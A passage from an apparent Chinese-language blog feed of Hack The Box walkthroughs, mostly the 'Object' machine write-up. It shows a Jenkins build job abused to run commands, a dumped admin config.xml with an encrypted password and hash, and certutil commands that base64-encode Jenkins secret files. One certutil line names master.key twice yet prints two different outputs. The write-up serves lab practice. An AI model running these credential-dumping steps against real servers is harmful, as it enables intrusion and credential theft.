class="hljs-built_in">groups</span>=0(root)                              ^X Read File<br><span class="hljs-comment"># cat /root/root.txt                                                M-F New Buffer</span><br>2984.................................<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Object</title>
    <link href="/post/HackTHeBox-Object.html"/>
    <url>/post/HackTHeBox-Object.html</url>
    
    <content type="html"><![CDATA[<h3 id="HTB-Walkthrough-Object"><a href="#HTB-Walkthrough-Object" class="headerlink" title="HTB Walkthrough - Object"></a>HTB Walkthrough - Object</h3><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.132<br>Host is up (0.27s latency).<br>Not shown: 65532 filtered tcp ports (no-response)<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Microsoft IIS httpd 10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: Mega Engines<br>|_http-server-header: Microsoft-IIS/10.0<br>5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>8080/tcp open  http    Jetty 9.4.43.v20210629<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html;charset=utf-8).</span><br><span class="hljs-string">|_http-server-header: Jetty(9.4.43.v20210629)</span><br><span class="hljs-string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 662.66 seconds</span><br></code></pre></td></tr></table></figure><p>顺着80端口我访问到了如下页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520152220923.png" alt="image-20220520152220923"  /><p>它为我指名了一条路，点击automation会跳转到8080端口，会有一个登录页面，如果没有帐号可以注册，我尝试注册了一个账号并登录了进去：<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520152349635.png" alt="image-20220520152349635"  /></p><p>在左上角New item中，一直往下拉会有一些似乎能够执行命令的功能：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520153456061.png" alt="image-20220520153456061"  /><p>但是直接填写命令并不会执行，我又试着在配置中寻找建立工作项目的要求：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520154132854.png" alt="image-20220520154132854"  /><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520154225293.png" alt="image-20220520154225293"  /><p>它的设计跟linux计划任务差不多。然后等一分钟会在左边构建历史刷新一个工作项目：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520154355060.png" alt="image-20220520154355060"  /><p>兴许是我建错了，我又试了试BAT：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520155154705.png" alt="image-20220520155154705"  /><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520155220091.png" alt="image-20220520155220091"  /><p>这个看起来可以，但尝试运行powershell报错了：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520160343554.png" alt="image-20220520160343554"  /><p>它不像是出现在我这边的问题，因为我排除过了，或许是目标在链接我的过程中被什么给拦截掉了，例如防火墙，我会试着去遍历防火墙规则：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bat">Started by timer<br>Running as SYSTEM<br>Building <span class="hljs-keyword">in</span> workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hack<br>[hack] $ <span class="hljs-built_in">cmd</span> /c <span class="hljs-keyword">call</span> C:\Users\oliver\AppData\Local\Temp\jenkins10631510078138780282.bat<br><span class="hljs-function"></span><br><span class="hljs-function">C:\<span class="hljs-title">Users</span>\<span class="hljs-title">oliver</span>\<span class="hljs-title">AppData</span>\<span class="hljs-title">Local</span>\<span class="hljs-title">Jenkins</span>\.<span class="hljs-title">jenkins</span>\<span class="hljs-title">workspace</span>\<span class="hljs-title">hack</span>&gt;<span class="hljs-title">powershell</span> -<span class="hljs-title">c</span> &quot;<span class="hljs-title">Get</span>-<span class="hljs-title">NetFirewallRule</span> -<span class="hljs-title">Direction</span> <span class="hljs-title">Outbound</span> -<span class="hljs-title">Enabled</span> <span class="hljs-title">True</span> -<span class="hljs-title">Action</span> <span class="hljs-title">Block</span> | <span class="hljs-title">Format</span>-<span class="hljs-title">Table</span> -<span class="hljs-title">Property</span> <span class="hljs-title">DisplayName</span>,@&#123;<span class="hljs-title">Name</span>=&#x27;<span class="hljs-title">Protocol</span>&#x27;;<span class="hljs-title">Expression</span>=&#123;($<span class="hljs-title">PSItem</span> | <span class="hljs-title">Get</span>-<span class="hljs-title">NetFirewallPortFilter</span>).<span class="hljs-title">Protocol</span>&#125;&#125;,@&#123;<span class="hljs-title">Name</span>=&#x27;<span class="hljs-title">LocalPort</span>&#x27;;<span class="hljs-title">Expression</span>=&#123;($<span class="hljs-title">PSItem</span> | <span class="hljs-title">Get</span>-<span class="hljs-title">NetFirewallPortFilter</span>).<span class="hljs-title">LocalPort</span>&#125;&#125;,@&#123;<span class="hljs-title">Name</span>=&#x27;<span class="hljs-title">RemotePort</span>&#x27;;<span class="hljs-title">Expression</span>=&#123;($<span class="hljs-title">PSItem</span> | <span class="hljs-title">Get</span>-<span class="hljs-title">NetFirewallPortFilter</span>).<span class="hljs-title">RemotePort</span>&#125;&#125;,@&#123;<span class="hljs-title">Name</span>=&#x27;<span class="hljs-title">RemoteAddress</span>&#x27;;<span class="hljs-title">Expression</span>=&#123;($<span class="hljs-title">PSItem</span> | <span class="hljs-title">Get</span>-<span class="hljs-title">NetFirewallAddressFilter</span>).<span class="hljs-title">RemoteAddress</span>&#125;&#125;, <span class="hljs-title">Enabled</span>, <span class="hljs-title">Profile</span>,<span class="hljs-title">Direction</span>,<span class="hljs-title">Action</span>&quot;  </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">DisplayName</span>     <span class="hljs-title">Protocol</span> <span class="hljs-title">LocalPort</span> <span class="hljs-title">RemotePort</span> <span class="hljs-title">RemoteAddress</span> <span class="hljs-title">Enabled</span> <span class="hljs-title">Profile</span> <span class="hljs-title">Direction</span> <span class="hljs-title">Action</span></span><br><span class="hljs-function">-----------     -------- --------- ---------- ------------- ------- ------- --------- ------</span><br><span class="hljs-function"><span class="hljs-title">BlockOutboundDC</span> <span class="hljs-title">TCP</span>      <span class="hljs-title">Any</span>       <span class="hljs-title">Any</span>        <span class="hljs-title">Any</span>              <span class="hljs-title">True</span>     <span class="hljs-title">Any</span>  <span class="hljs-title">Outbound</span>  <span class="hljs-title">Block</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">oliver</span>\<span class="hljs-title">AppData</span>\<span class="hljs-title">Local</span>\<span class="hljs-title">Jenkins</span>\.<span class="hljs-title">jenkins</span>\<span class="hljs-title">workspace</span>\<span class="hljs-title">hack</span>&gt;<span class="hljs-title">exit</span> 0 </span><br><span class="hljs-function"><span class="hljs-title">Finished</span>: <span class="hljs-title">SUCCESS</span></span><br></code></pre></td></tr></table></figure><p>阻止所有流量出站。那么我现在就只能慢慢的枚举目标身上或许会有遗留的身份口令：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">C:\<span class="hljs-title">Users</span>\<span class="hljs-title">oliver</span>\<span class="hljs-title">AppData</span>\<span class="hljs-title">Local</span>\<span class="hljs-title">Jenkins</span>\.<span class="hljs-title">jenkins</span>\<span class="hljs-title">workspace</span>\<span class="hljs-title">hack</span>&gt;<span class="hljs-title">powershell</span> -<span class="hljs-title">c</span> <span class="hljs-title">ls</span> ..\..\<span class="hljs-title">users</span>\<span class="hljs-title">admin_17207690984073220035</span>  </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">    <span class="hljs-title">Directory</span>: <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">oliver</span>\<span class="hljs-title">AppData</span>\<span class="hljs-title">Local</span>\<span class="hljs-title">Jenkins</span>\.<span class="hljs-title">jenkins</span>\<span class="hljs-title">users</span>\<span class="hljs-title">admin_17207690984073220035</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Mode</span>                <span class="hljs-title">LastWriteTime</span>         <span class="hljs-title">Length</span> <span class="hljs-title">Name</span>                                                                  </span><br><span class="hljs-function">----                -------------         ------ ----                                                                  </span><br><span class="hljs-function">-<span class="hljs-title">a</span>----       10/21/2021   2:22 <span class="hljs-title">AM</span>           3186 <span class="hljs-title">config.xml</span>                                                            </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">oliver</span>\<span class="hljs-title">AppData</span>\<span class="hljs-title">Local</span>\<span class="hljs-title">Jenkins</span>\.<span class="hljs-title">jenkins</span>\<span class="hljs-title">workspace</span>\<span class="hljs-title">hack</span>&gt;<span class="hljs-title">exit</span> 0 </span><br><span class="hljs-function"><span class="hljs-title">Finished</span>: <span class="hljs-title">SUCCESS</span></span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs xml">Started by timer<br>Running as SYSTEM<br>Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hack<br>[hack] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins5388654822585046630.bat<br><br>C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hack&gt;powershell -c type ..\..\users\admin_17207690984073220035\config.xml <br><span class="hljs-meta">&lt;?xml version=&#x27;1.1&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">fullName</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">fullName</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty</span> <span class="hljs-attr">plugin</span>=<span class="hljs-string">&quot;credentials@2.6.1&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">domainCredentialsMap</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;hudson.util.CopyOnWriteMap$Hash&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">com.cloudbees.plugins.credentials.domains.Domain</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">specifications</span>/&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">com.cloudbees.plugins.credentials.domains.Domain</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">java.util.concurrent.CopyOnWriteArrayList</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>320a60b9-1e5c-4399-8afe-44466c9cde9e<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>oliver<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>&#123;AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">usernameSecret</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">usernameSecret</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.concurrent.CopyOnWriteArrayList</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">domainCredentialsMap</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty</span> <span class="hljs-attr">plugin</span>=<span class="hljs-string">&quot;email-ext@2.84&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">triggers</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hudson.model.MyViewsProperty</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">views</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hudson.model.AllView</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">owner</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;hudson.model.MyViewsProperty&quot;</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../..&quot;</span>/&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>all<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">filterExecutors</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">filterExecutors</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">filterQueue</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">filterQueue</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">properties</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;hudson.model.View$PropertyList&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">hudson.model.AllView</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">views</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">hudson.model.MyViewsProperty</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty</span> <span class="hljs-attr">plugin</span>=<span class="hljs-string">&quot;display-url-api@2.3.5&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">providerId</span>&gt;</span>default<span class="hljs-tag">&lt;/<span class="hljs-name">providerId</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hudson.model.PaneStatusProperties</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">collapsed</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">hudson.model.PaneStatusProperties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jenkins.security.seed.UserSeedProperty</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">seed</span>&gt;</span>ea75b5bd80e4763e<span class="hljs-tag">&lt;/<span class="hljs-name">seed</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">jenkins.security.seed.UserSeedProperty</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hudson.search.UserSearchProperty</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">insensitiveSearch</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">insensitiveSearch</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">hudson.search.UserSearchProperty</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hudson.model.TimeZoneProperty</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hudson.security.HudsonPrivateSecurityRealm_-Details</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">passwordHash</span>&gt;</span>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW<span class="hljs-tag">&lt;/<span class="hljs-name">passwordHash</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">hudson.security.HudsonPrivateSecurityRealm_-Details</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hudson.tasks.Mailer_-UserProperty</span> <span class="hljs-attr">plugin</span>=<span class="hljs-string">&quot;mailer@1.34&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">emailAddress</span>&gt;</span>admin@object.local<span class="hljs-tag">&lt;/<span class="hljs-name">emailAddress</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">hudson.tasks.Mailer_-UserProperty</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jenkins.security.ApiTokenProperty</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">tokenStore</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tokenList</span>/&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">tokenStore</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">jenkins.security.ApiTokenProperty</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jenkins.security.LastGrantedAuthoritiesProperty</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">roles</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>authenticated<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">roles</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">timestamp</span>&gt;</span>1634793332195<span class="hljs-tag">&lt;/<span class="hljs-name">timestamp</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">jenkins.security.LastGrantedAuthoritiesProperty</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><br>C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hack&gt;exit 0 <br>Finished: SUCCESS<br></code></pre></td></tr></table></figure><p>看起来有用户名，也有密码，但密码是加密的：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/hoto/</span>jenkins-credentials-decryptor<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520163740979.png" alt="image-20220520163740979"  /><p>在传输过程中有些会乱码，直接复制怕是不行，可以考虑一下编码：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bat">Started by timer<br>Running as SYSTEM<br>Building <span class="hljs-keyword">in</span> workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hack<br>[hack] $ <span class="hljs-built_in">cmd</span> /c <span class="hljs-keyword">call</span> C:\Users\oliver\AppData\Local\Temp\jenkins18098842999269558108.bat<br><span class="hljs-function"></span><br><span class="hljs-function">C:\<span class="hljs-title">Users</span>\<span class="hljs-title">oliver</span>\<span class="hljs-title">AppData</span>\<span class="hljs-title">Local</span>\<span class="hljs-title">Jenkins</span>\.<span class="hljs-title">jenkins</span>\<span class="hljs-title">workspace</span>\<span class="hljs-title">hack</span>&gt;<span class="hljs-title">certutil</span> -<span class="hljs-title">encode</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">oliver</span>\<span class="hljs-title">AppData</span>\<span class="hljs-title">Local</span>\<span class="hljs-title">Jenkins</span>\.<span class="hljs-title">jenkins</span>\<span class="hljs-title">secrets</span>\<span class="hljs-title">master.key</span> <span class="hljs-title">h.b64</span>   &amp; <span class="hljs-title">certutil</span> -<span class="hljs-title">encode</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">oliver</span>\<span class="hljs-title">AppData</span>\<span class="hljs-title">Local</span>\<span class="hljs-title">Jenkins</span>\.<span class="hljs-title">jenkins</span>\<span class="hljs-title">secrets</span>\<span class="hljs-title">master.key</span> <span class="hljs-title">m.b64</span>   &amp; <span class="hljs-title">more</span> .\<span class="hljs-title">h.b64</span>   &amp; <span class="hljs-title">more</span> .\<span class="hljs-title">m.b64</span> </span><br><span class="hljs-function"><span class="hljs-title">Input</span> <span class="hljs-title">Length</span> = 256</span><br><span class="hljs-function"><span class="hljs-title">Output</span> <span class="hljs-title">Length</span> = 412</span><br><span class="hljs-function"><span class="hljs-title">CertUtil</span>: -<span class="hljs-title">encode</span> <span class="hljs-title">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.</span><br><span class="hljs-function"><span class="hljs-title">Input</span> <span class="hljs-title">Length</span> = 256</span><br><span class="hljs-function"><span class="hljs-title">Output</span> <span class="hljs-title">Length</span> = 412</span><br><span class="hljs-function"><span class="hljs-title">CertUtil</span>: -<span class="hljs-title">encode</span> <span class="hljs-title">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.</span><br><span class="hljs-function">-----<span class="hljs-title">BEGIN</span> <span class="hljs-title">CERTIFICATE</span>-----</span><br><span class="hljs-function"><span class="hljs-title">gWFQFlTxi</span>+<span class="hljs-title">xRdwcz6KgADwG</span>+<span class="hljs-title">rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu</span></span><br><span class="hljs-function">2<span class="hljs-title">SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf</span>+<span class="hljs-title">Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHO</span></span><br><span class="hljs-function"><span class="hljs-title">kX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS</span>+<span class="hljs-title">r</span>+2<span class="hljs-title">L</span></span><br><span class="hljs-function"><span class="hljs-title">AORHdFzxUeVfXcaalJ3HBhI</span>+<span class="hljs-title">Si</span>+<span class="hljs-title">pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9</span></span><br><span class="hljs-function"><span class="hljs-title">GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzc</span></span><br><span class="hljs-function"><span class="hljs-title">pBZeiPbwhyrhy</span>/<span class="hljs-title">mCWogCddKudAJkHMqEISA3et9RIgA</span>=</span><br><span class="hljs-function">-----<span class="hljs-title">END</span> <span class="hljs-title">CERTIFICATE</span>-----</span><br><span class="hljs-function">-----<span class="hljs-title">BEGIN</span> <span class="hljs-title">CERTIFICATE</span>-----</span><br><span class="hljs-function"><span class="hljs-title">ZjY3M2ZkYjBjNGZjYzMzOTA3MDQzNWJkYmUxYTAzOWQ4M2E1OTdiZjIxZWFmYmI3</span></span><br><span class="hljs-function"><span class="hljs-title">ZjliMzViNTBmY2UwMDZlNTY0Y2ZmNDU2NTUzZWQ3M2NiMWZhNTY4YjY4YjMxMGFk</span></span><br><span class="hljs-function"><span class="hljs-title">ZGM1NzZmMTYzN2E3ZmU3MzQxNGE0YzZmZjEwYjRlMjNhZGM1MzhlOWIzNjlhMGM2</span></span><br><span class="hljs-function"><span class="hljs-title">ZGU4ZmMyOTlkZmEyYTM5MDRlYzczYTI0YWE0ODU1MGIyNzZiZTUxZjkxNjU2Nzk1</span></span><br><span class="hljs-function"><span class="hljs-title">OTViMmNhYzAzY2MyMDQ0ZjNjNzAyZDY3NzE2OWUyZjRkM2JkOTZkODMyMWEyZTE5</span></span><br><span class="hljs-function"><span class="hljs-title">ZTJiZjBjNzZmZTMxZGIxOQ</span>==</span><br><span class="hljs-function">-----<span class="hljs-title">END</span> <span class="hljs-title">CERTIFICATE</span>-----</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">oliver</span>\<span class="hljs-title">AppData</span>\<span class="hljs-title">Local</span>\<span class="hljs-title">Jenkins</span>\.<span class="hljs-title">jenkins</span>\<span class="hljs-title">workspace</span>\<span class="hljs-title">hack</span>&gt;<span class="hljs-title">exit</span> 0 </span><br><span class="hljs-function"><span class="hljs-title">Finished</span>: <span class="hljs-title">SUCCESS</span></span><br></code></pre></td></tr></table></figure><figure 